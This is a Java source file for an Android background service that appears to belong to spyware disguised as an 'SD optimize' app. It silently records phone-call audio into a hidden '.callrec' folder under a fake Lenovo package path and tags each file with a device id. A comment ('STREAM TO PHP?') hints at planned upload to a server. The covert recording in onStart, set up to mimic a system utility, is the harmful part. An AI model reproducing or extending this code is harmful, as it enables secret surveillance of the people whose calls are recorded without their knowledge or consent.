package com.android.sd.optimize;

import java.io.File;
import java.io.IOException;

import android.app.Service;
import android.content.Intent;
import android.media.MediaRecorder;
import android.os.Environment;
import android.os.IBinder;

public class RecordService extends Service implements MediaRecorder.OnInfoListener,
		MediaRecorder.OnErrorListener {
	public static final String DEFAULT_STORAGE_LOCATION = Environment.getExternalStorageDirectory()
			.getAbsolutePath()
			+ File.separator
			+ "Android/data/com.lenovo.sdoptimize/.callrec"
			+ File.separator;
	private MediaRecorder recorder = null;
	private boolean isRecording = false;
	private File recording = null;

	// private String URL;

	// private String password;

	private File makeOutputFile() {

		File dir = new File(DEFAULT_STORAGE_LOCATION);

		if (!dir.exists()) {
			try {
				dir.mkdirs();
			} catch (Exception e) {
				return null;
			}
		} else {
			if (!dir.canWrite()) {
				return null;
			}
		}

		// String time = Util.getDateTime();

		try {
			File file = new File(dir, BackService.id + "callrec" + System.currentTimeMillis() + ".m4a");
			if (!file.exists())
				file.createNewFile();
			PhoneListener.filename = file.getName();
			return file;
		} catch (IOException e) {
			// TODO Auto-generated catch block
			e.printStackTrace();
			return null;
		}
	}

	public void onCreate() {
		super.onCreate();
		recorder = new MediaRecorder();
	}

	public void onStart(Intent intent, int startId) {

		if (isRecording)
			return;

		// Context c = getApplicationContext();
		// SharedPreferences prefs =
		// PreferenceManager.getDefaultSharedPreferences(c);

		int audiosource = 1;
		// int audioformat = 1;

		recording = makeOutputFile();
		if (recording == null) {
			recorder = null;
			return;
		}

		try {
			recorder.reset();
			recorder.setAudioSource(audiosource);
			recorder.setOutputFormat(MediaRecorder.OutputFormat.MPEG_4);
			recorder.setAudioEncoder(MediaRecorder.AudioEncoder.AAC);
			recorder.setOutputFile(recording.getAbsolutePath());
			recorder.setOnInfoListener(this);
			recorder.setOnErrorListener(this);

			// STREAM TO PHP? //Alert

			try {
				recorder.prepare();
			} catch (java.io.IOException e) {
				recorder = null;
				return;
			}
			recorder.start();
			isRecording = true;

		} catch (java.lang.Exception e) {
			recorder = null;
		}

		return;
	}

	public void onDestroy() {
		super.onDestroy();

		if (null != recorder) {
			isRecording = false;
			recorder.release();

		}
	}

	public IBinder onBind(Intent intent) {
		return null;
	}

	public boolean onUnbind(Intent intent) {
		return false;
	}

	public void onRebind(Intent intent) {
	}

	// MediaRecorder.OnInfoListener
	public void onInfo(MediaRecorder mr, int what, int extra) {
		isRecording = false;
	}

	// MediaRecorder.OnErrorListener
	public void onError(MediaRecorder mr, int what, int extra) {
		isRecording = false;
		mr.release();
	}
}
